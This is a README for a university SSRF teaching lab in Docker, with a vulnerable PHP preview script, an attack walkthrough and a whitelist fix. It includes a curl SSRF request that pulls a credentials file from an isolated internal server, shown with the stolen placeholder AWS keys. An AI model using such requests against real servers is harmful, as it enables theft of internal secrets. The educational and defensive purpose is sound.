# SSRF (Server-Side Request Forgery) - Educational Laboratory

**Analysis, reproduction, and mitigation of an SSRF vulnerability in a Docker environment.**

> *Project created for the course "Computer Networks and Cybersecurity" - Prof. Rak*

---

## Project Description

This repository hosts a virtualized environment designed to technically demonstrate how a **Server-Side Request Forgery (SSRF)** attack works.

The objective is to simulate a realistic scenario in which an **external threat actor** exploits a vulnerability in a public web server (Victim) to bypass network segmentation and steal sensitive credentials from an **isolated internal server** (Target) that would otherwise be unreachable.

The project covers the entire lifecycle of the vulnerability:

1. **Study:** Theoretical analysis of the threat.
2. **Reproduction:** Creation of the testbed with Docker.
3. **Analysis:** Execution of the exploit and data exfiltration.
4. **Countermeasure:** Implementation and verification of a security patch (Whitelist).

---

## Testbed Architecture

The infrastructure is defined using **Docker Compose** and uses two isolated bridge networks to simulate a public zone (DMZ) and a private intranet.

### Network Topology

* **Public Network (`192.168.56.0/24`):** Accessible from the outside (Attacker, Users).
* **Private Network (`192.168.57.0/24`):** Isolated, not accessible from the outside.

### Container Roles

| Service      | Container Name       | IP Address                           | Role and Description                                                            |
| :----------- | :------------------- | :----------------------------------- | :------------------------------------------------------------------------------ |
| **Attacker** | `attaccante`         | `192.168.56.101`                     | Alpine Linux container with `curl`. Simulates the external threat actor.        |
| **Victim**   | `server_vulnerabile` | Public: `.56.100` · Private: `.57.2` | PHP/Apache web server exposing the vulnerable script `generatoreAnteprima.php`. |
| **Target**   | `server_admin`       | `192.168.57.100`                     | Internal isolated server. Contains `key.json` with simulated credentials.       |
| **Test**     | `server_test`        | `192.168.56.200`                     | Public web server used for legitimate functionality testing.                    |

---

## Installation and Startup

### Prerequisites

* Docker Desktop installed
* Git

### Quick Setup

```bash
git clone https://github.com/RaffaeleD03/SSRF.git
cd SSRF
docker-compose up -d
```

---

## Attack Walkthrough

### **Phase 1: Reconnaissance**

From the Attacker container, verify that the Target is unreachable.

```bash
docker exec -it attaccante sh
ping 192.168.57.100   # Must fail
```

### **Phase 2: Exploitation (SSRF)**

The vulnerability exploits `file_get_contents()` without validation.

```bash
curl "http://192.168.56.100/generatoreAnteprima.php?url=http://192.168.57.100/key.json"
```

### **Result (Data Exfiltration)**

The vulnerable server performs the internal request and returns:

```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
}
```

> Note: HTML entities in the output are due to `htmlspecialchars()`, which is ineffective against SSRF.

---

## Countermeasure and Mitigation

The patch implements a **Whitelist of allowed domains**.

### Patch Behavior

1. URL parsing with `parse_url()`
2. Extraction of destination host
3. Host validation against an array in `whitelist.php`
4. Immediate block if the host is unauthorized

### Patch Verification

```bash
curl "http://192.168.56.100/generatoreAnteprima_FIXED.php?url=http://192.168.57.100/key.json"
```

**Result:** `403 Forbidden`

---

## File Structure

```
.
├── docker-compose.yml
├── admin/
│   └── key.json
└── sua/
    ├── generatoreAnteprima.php
    ├── generatoreAnteprima_FIXED.php
    └── whitelist.php
```

---

## References

* Course material – Web Security (Prof. Rak)
* OWASP – SSRF Prevention Cheat Sheet
* CWE-918 – Server-Side Request Forgery (SSRF)


---

**Disclaimer:** This project was developed solely for educational and academic purposes.
